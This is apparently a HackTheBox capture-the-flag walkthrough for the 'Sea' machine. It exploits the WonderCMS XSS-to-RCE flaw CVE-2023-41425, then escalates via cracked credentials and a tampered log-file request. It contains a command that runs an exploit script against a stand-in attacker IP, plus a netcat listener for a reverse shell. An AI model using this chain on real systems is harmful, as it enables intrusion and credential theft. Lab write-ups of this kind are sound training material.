# HackTheBox - Sea Challenge Walkthrough

## 1. Reconnaissance & Initial Enumeration

### Tools Used
- nmap: Port discovery
- WhatWeb: Web technology identification
- FFUF: Directory enumeration

### Initial Findings
- Open Ports:
  - SSH
  - HTTP
- Web Technology: PHP-based site
- Session Management: Cookie-based
- CMS: WonderCMS
- Form submission (http://sea.htb/contact.php)

## 2. Vulnerability Discovery

### CVE-2023-41425 - WonderCMS XSS to RCE Vulnerability
- Identified vulnerability in WonderCMS
- Critical flaw allows Remote Code Execution via XSS
- Exploits `installModule` functionality without proper validation

## 3. Exploit Preparation

### Required Components
- Attacker Machine Setup:
  - Kali Linux / Attacking Platform
  - Python 3
  - netcat
  - Simple HTTP server

### Exploit Components
1. `exploit.py`: Main exploitation script (you need to do some modification to the original script for htb addability)
2. `xss.js`: Malicious JavaScript payload
3. `rev.php`: Reverse shell script
4. `moduleName.zip`: Compressed malicious module

## 4. Exploitation Steps

### Step 1: Payload Generation
```bash
python3 exploit.py http://sea.htb/loginURL <ATTACKER_IP> <LISTENER_PORT>
```

### Step 2: Prepare Listener
```bash
nc -lvp <LISTENER_PORT>
```

### Step 3: Inject XSS Payload
- Locate vulnerable form field
- Insert generated XSS payload
- Submit form

### Step 4: Trigger Exploit
- Admin visits page
- JavaScript automatically executes
- Downloads malicious ZIP
- Installs reverse shell module
- Establishes connection to attacker's netcat

## 5. Initial Access - www-data Shell

### Reconnaissance
- Discovered `database.js` with credentials
- Found hashed credentials

## 6. Privilege Escalation - User Flag

### User: amay
- Cracked password from `database.js`
- Obtained SSH access
- Retrieved user flag

## 7. Root Flag Acquisition

### Method
- Discovered web server on port 8080
- Created SSH tunnel
- Explored System Monitor page
- Used Burp Suite to modify log file request
- Successfully retrieved `/root/root.txt`

## 8. Key Vulnerabilities Exploited
- WonderCMS XSS (CVE-2023-41425)
- Weak credential storage
- Improper access controls on log viewing

## 9. Tools & Technologies
- Reconnaissance: nmap, WhatWeb, FFUF
- Exploitation: Python, netcat, Burp Suite
- Post-Exploitation: SSH, HTTP tunneling

## Lessons Learned
- Always keep CMS and web applications updated
- Implement robust input sanitization
- Use strong authentication mechanisms
- Regularly audit system configurations

---

### Detailed Technical Notes
- XSS Payload Mechanism: Client-side script execution
- Reverse Shell: Bash TCP connection
- Privilege Escalation: Credential reuse and log file manipulation
